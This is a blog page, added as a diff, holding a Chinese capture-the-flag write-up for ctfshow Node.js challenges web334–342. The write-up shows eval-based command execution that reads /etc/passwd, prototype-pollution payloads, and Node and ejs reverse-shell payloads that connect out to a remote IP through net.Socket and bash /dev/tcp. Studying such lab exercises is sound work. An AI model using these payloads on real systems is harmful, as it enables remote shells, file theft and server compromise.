@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="web334 little trick考察js特性: 参考 https:&#x2F;&#x2F;www.leavesongs.com&#x2F;HTML&#x2F;javascript-up-low-ercase-tip.html 1234567toUpperCase():ı  &#x3D;&#x3D;&gt;Iſ  &#x3D;&#x3D;&gt;StoLowerCase():İ  &#x3D;&#x3D;&gt;iK  &#x3D;&#x3D;&gt;k  web335 rcenodeJs命令执行,可以读文件,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web入门 Node WP">
+<meta property="og:url" content="http://l0nnnaruu.github.io/2021/02/15/nodejs/index.html">
+<meta property="og:site_name" content="L0nm4r|Blog">
+<meta property="og:description" content="web334 little trick考察js特性: 参考 https:&#x2F;&#x2F;www.leavesongs.com&#x2F;HTML&#x2F;javascript-up-low-ercase-tip.html 1234567toUpperCase():ı  &#x3D;&#x3D;&gt;Iſ  &#x3D;&#x3D;&gt;StoLowerCase():İ  &#x3D;&#x3D;&gt;iK  &#x3D;&#x3D;&gt;k  web335 rcenodeJs命令执行,可以读文件,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/15/nodejs/1613016506250.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/15/nodejs/1613018214898.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/15/nodejs/1613041146851.png">
+<meta property="og:image" content="http://l0nnnaruu.github.io/2021/02/15/nodejs/1613045113959.png">
+<meta property="article:published_time" content="2021-02-15T05:06:02.000Z">
+<meta property="article:modified_time" content="2021-02-22T08:00:44.000Z">
+<meta property="article:author" content="L0nm4r">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://l0nnnaruu.github.io/2021/02/15/nodejs/1613016506250.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ctfshow web入门 Node WP</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">归档</a></li><li><a target="_blank" rel="noopener" href="https://github.com/L0nm4r">项目</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/02/15/nmap%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/08/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96(PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98)/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://l0nnnaruu.github.io/2021/02/15/nodejs/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&text=ctfshow web入门 Node WP"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&is_video=false&description=ctfshow web入门 Node WP"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow web入门 Node WP&body=Check out this article: http://l0nnnaruu.github.io/2021/02/15/nodejs/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&title=ctfshow web入门 Node WP"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://l0nnnaruu.github.io/2021/02/15/nodejs/&name=ctfshow web入门 Node WP&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web334-little-trick"><span class="toc-number">1.</span> <span class="toc-text">web334 little trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web335-rce"><span class="toc-number">2.</span> <span class="toc-text">web335 rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web336-rce-bypas"><span class="toc-number">3.</span> <span class="toc-text">web336 rce bypas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web337-js%E6%95%B0%E7%BB%84"><span class="toc-number">4.</span> <span class="toc-text">web337 js数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-merage"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染 merage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web339-RCE"><span class="toc-number">6.</span> <span class="toc-text">web339 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web340"><span class="toc-number">7.</span> <span class="toc-text">web340</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web341-ejs-RCE"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#342"><span class="toc-number">9.</span> <span class="toc-text">342</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#344-nodejs%E7%89%B9%E6%80%A7"><span class="toc-number">10.</span> <span class="toc-text">344 nodejs特性</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ctfshow web入门 Node WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">L0nm4r|Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-02-15T05:06:02.000Z" itemprop="datePublished">2021-02-15</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/nodejs/" rel="tag">nodejs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="web334-little-trick"><a href="#web334-little-trick" class="headerlink" title="web334 little trick"></a>web334 little trick</h2><p>考察js特性: 参考 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">toUpperCase():</span><br><span class="line">ı  ==&gt;I</span><br><span class="line">ſ  ==&gt;S</span><br><span class="line"></span><br><span class="line">toLowerCase():</span><br><span class="line">İ  ==&gt;i</span><br><span class="line">K  ==&gt;k</span><br></pre></td></tr></table></figure>
+
+<h2 id="web335-rce"><a href="#web335-rce" class="headerlink" title="web335 rce"></a>web335 rce</h2><p>nodeJs命令执行,可以读文件,但是没找到flag</p>
+<p><code>require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;, &#39;utf-8&#39;);</code></p>
+<p>尝试执行系统命令<code> require(&#39;child_process&#39;).execSync(&#39;whoami&#39;);</code></p>
+<p><code>?eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;);</code></p>
+<p><code> require(&#39;child_process&#39;).spawnSync(&#39;whoami&#39;);</code></p>
+<h2 id="web336-rce-bypas"><a href="#web336-rce-bypas" class="headerlink" title="web336 rce bypas"></a>web336 rce bypas</h2><p>有绕过,可以先读代码</p>
+<p><code>?eval=__filename</code>读当前文件路径</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">var</span> router = express.Router(); </span><br><span class="line"><span class="comment">/* GET home page. */</span> </span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123; </span><br><span class="line">    res.type(<span class="string">&#x27;html&#x27;</span>); </span><br><span class="line">    <span class="keyword">var</span> evalstring = req.query.eval; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span>(evalstring)==<span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.search(<span class="regexp">/exec|load/i</span>)&gt;<span class="number">0</span>)&#123; </span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span>&#125;); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring) &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;); </span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>ban了exec和load , nodejs引入函数不仅能package.function还能 package[‘function’]</p>
+<p>bypass: <code>require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;, &#39;utf-8&#39;);</code></p>
+<h2 id="web337-js数组"><a href="#web337-js数组" class="headerlink" title="web337 js数组"></a>web337 js数组</h2><p>给了代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.query.a;</span><br><span class="line">  <span class="keyword">var</span> b = req.query.b;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">  	res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="1613016506250.png" alt="1613016506250"></p>
+<p>如上图,js中两个数组是不能直接用===判断是否相等的.<br>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/chri330dj/p/12420458.html">https://www.cnblogs.com/chri330dj/p/12420458.html</a><br>而且<code>typeof(array+string)=string</code><br>所以传数组参数可以绕过<code>?a[0]=&amp;b[0]=1</code></p>
+<h2 id="web338-原型链污染-merage"><a href="#web338-原型链污染-merage" class="headerlink" title="web338 原型链污染 merage"></a>web338 原型链污染 merage</h2><p>routes/login.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+<p>getFlag条件是<code>secert.ctfshow===&#39;36dboy&#39;</code> , 跟踪到<code>utils/common</code> , 发现是  <code>Object recursive merge</code> 的一段代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload : <code>&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</code>, 通过污染<code>&#123;&#125;</code>,来达到条件</p>
+<p><img src="1613018214898.png" alt="1613018214898"></p>
+<h2 id="web339-RCE"><a href="#web339-RCE" class="headerlink" title="web339 RCE"></a>web339 RCE</h2><p>发现this变量似乎指向了一个全局空间</p>
+<p> 面向对象语言中 this 表示当前对象的一个引用 , <del>考虑把<code>user.__proto__.ctfshow</code>赋值为<code>this.flag</code></del></p>
+<p>login.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  <span class="built_in">console</span>.log(query)</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="built_in">JSON</span>.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><code>secert.ctfshow===flag</code>是无法实现了. </p>
+<p>在api.js , 可以通过参数污染控制query,然后实现RCE</p>
+<p><code>Function</code>:<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(query);</span><br><span class="line">  res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>payload: 反弹shell (下面这个一直没成功)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(1001,&#x27;91.67.943.121&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;</span>&#125;&#125;</span><br><span class="line"><span class="comment">// node 反弹shell</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();client.connect(<span class="number">1001</span>,<span class="string">&quot;91.67.943.121&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);<span class="keyword">return</span> <span class="regexp">/a/</span>; &#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>后来在P牛博客看到, <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></p>
+<p><img src="1613041146851.png" alt="1613041146851"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;var net = process.mainModule.constructor._load(&#x27;net&#x27;),cp = process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(1001,&#x27;91.67.943.121&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再次尝试反弹shell.</p>
+<p><img src="1613045113959.png" alt="1613045113959"></p>
+<p>Express运行环境和node shell环境下结果不一致//坑死在这里了</p>
+<h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>关键代码变成了下面的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;   </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.copy(user.userinfo,req.body); <span class="comment">// 危</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;user.userinfo&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">   res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>不能直接修改isAdmin的值,但是可以找两次原型污染query</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;var net = process.mainModule.constructor._load(&#x27;net&#x27;),cp = process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(1001,&#x27;91.67.943.121&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web341-ejs-RCE"><a href="#web341-ejs-RCE" class="headerlink" title="web341 ejs RCE"></a>web341 ejs RCE</h2><p>ejs模板引擎的原型链污染RCE reference: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113">https://xz.aliyun.com/t/6113</a></p>
+<p>污染最上层就能影响到整个模板.还是挺神奇的.</p>
+<p>payload:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/91.67.943.121/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以后再好好审计研究一下.</p>
+<h2 id="342"><a href="#342" class="headerlink" title="342"></a>342</h2><p>app.js 可以看到模板引擎换成了jade, 然后 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a> 这篇文章里面找到一个payload,失败了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.engine(<span class="string">&#x27;jade&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>).__express); </span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;jade&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
